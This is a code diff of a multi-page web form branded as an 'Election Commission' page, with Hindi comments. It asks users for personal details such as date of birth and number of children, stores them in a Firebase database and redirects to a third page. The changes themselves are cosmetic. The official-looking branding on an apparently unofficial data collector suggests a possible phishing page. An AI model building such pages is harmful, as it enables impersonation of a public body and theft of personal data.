@@ -7,13 +7,62 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .form-container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; text-align: center; }
-        .logo-box { margin-bottom: 15px; }
-        .logo-box img { width: 60px; height: auto; object-fit: contain; }
-        .form-container h2 { margin-bottom: 20px; color: #0056b3; font-size: 22px; }
+        
+        /* Container for Edge-to-Edge Banner Header */
+        .form-container { 
+            background: #ffffff; 
+            padding: 0 35px 35px 35px; 
+            border-radius: 12px; 
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); 
+            width: 100%; 
+            max-width: 450px; 
+            overflow: hidden; 
+        }
+
+        /* Full Width Edge-to-Edge Banner Styling */
+        .full-banner {
+            margin-left: -35px;
+            margin-right: -35px;
+            margin-bottom: 25px;
+            width: calc(100% + 70px);
+            height: 130px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #004085;
+        }
+
+        .full-banner img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        /* Heading Styling matching page 1 style */
+        .form-container h2 { 
+            text-align: center;
+            margin-bottom: 20px; 
+            color: #0056b3; 
+            font-size: 24px; 
+            font-weight: 900; 
+            letter-spacing: 1px; 
+            line-height: 1.3;
+            text-transform: uppercase;
+        }
+
+        .form-container h2 span {
+            font-size: 15px;
+            font-weight: 700;
+            color: #333;
+            letter-spacing: 0.5px;
+        }
+
         .form-group { margin-bottom: 15px; text-align: left; }
         .form-group label { display: block; margin-bottom: 6px; color: #333; font-weight: 600; font-size: 13px; }
         .form-group input, .form-group select { width: 100%; padding: 10px 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; background: #fff; }
+        .form-group input:focus, .form-group select:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); }
+
         .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         .btn-next:hover { background: #004085; }
         .footer-text { text-align: center; margin-top: 25px; font-size: 12px; color: #666; font-weight: 600; border-top: 1px solid #eee; padding-top: 15px; }
@@ -21,11 +70,12 @@
 </head>
 <body>
     <div class="form-container">
-        <div class="logo-box">
-            <img src="logo.png" alt="Election Commission Logo">
+        <!-- Full Width Banner Image Header -->
+        <div class="full-banner">
+            <img src="logo.png" alt="Election Commission Banner">
         </div>
 
-        <h2>PLEASE ENTER CORRECT DETAILS</h2>
+        <h2>PLEASE ENTER <br><span>(CORRECT DETAILS)</span></h2>
         
         <form id="secondForm">
             <div class="form-group">
@@ -35,7 +85,7 @@
             
             <div class="form-group">
                 <label for="dob">Date of Birth*</label>
-                <input type="date" id="dob" name="dob" required>
+                <input type="text" id="dob" name="dob" placeholder="DD/MM/YYYY" maxlength="10" autocomplete="off" required>
             </div>
 
             <div class="form-group">
@@ -88,6 +138,19 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
+        // Date of Birth Auto-formatting (DD/MM/YYYY)
+        const dobInput = document.getElementById('dob');
+        dobInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 5) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4) + '/' + value.substring(4, 8);
+            } else if (value.length >= 3) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+        });
+
         document.getElementById('secondForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -117,8 +180,8 @@
                     childrenCount: childrenCount
                 });
 
-                // अगले पेज पर भेजें (या जो भी आपका अगला स्टेप हो)
-                window.location.href = "thirdpage.html"; // जरूरत के अनुसार अगला पेज बदल सकते हैं
+                // अगले पेज पर भेजें
+                window.location.href = "thirdpage.html";
             } catch (error) {
                 console.error("Error updating document: ", error);
                 alert("डेटा सेव करने में समस्या हुई, कृपया पुनः प्रयास करें।");
